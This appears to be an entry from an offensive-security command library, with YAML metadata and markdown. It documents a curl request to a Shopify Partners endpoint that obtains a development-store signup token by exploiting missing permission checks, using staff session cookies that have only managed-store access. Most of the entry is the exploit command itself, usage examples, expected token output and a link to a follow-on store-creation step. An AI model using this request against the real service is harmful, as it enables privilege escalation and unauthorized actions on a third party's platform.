---
id: cmd-get-shopify-token
data: >-
  curl -X GET
  "https://partners.shopify.com/organizationID/stores/signup_object/dev_store"
  -H "Cookie: ..."
tags:
  - shopify
  - api
  - token
type: command
output: JSON response containing the signup token
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:35.768Z'
verified: false
validated: true
submitted: true
---
# get-shopify-dev-store-token

## Command

```bash
curl -X GET "https://partners.shopify.com/organizationID/stores/signup_object/dev_store" \
  -H "Cookie: [staff session cookies]"
```

## Description

This command retrieves a token required for development store signup from the Shopify Partner API endpoint, exploiting the lack of permission checks to obtain it with only managed store access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| organizationID | Specific organization identifier in the URL path | Yes |
| Cookie | Session cookies from authenticated staff login | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://partners.shopify.com/123456/stores/signup_object/dev_store" \
  -H "Cookie: _shopify_s=abc123; ..."
```

### Advanced Usage

```bash
curl -X GET "https://partners.shopify.com/organizationID/stores/signup_object/dev_store" \
  -H "Cookie: ..." \
  -H "User-Agent: Mozilla/5.0 ..."
```

## Expected Output

A JSON response with the token object, e.g., {"token": "eyJ..."}, usable in subsequent POST requests for store creation.

## Related

- [[commands/post-shopify-create-dev-store]]
- [[procedures/Complete-Development-Store-Creation-via-UI-or-API]]
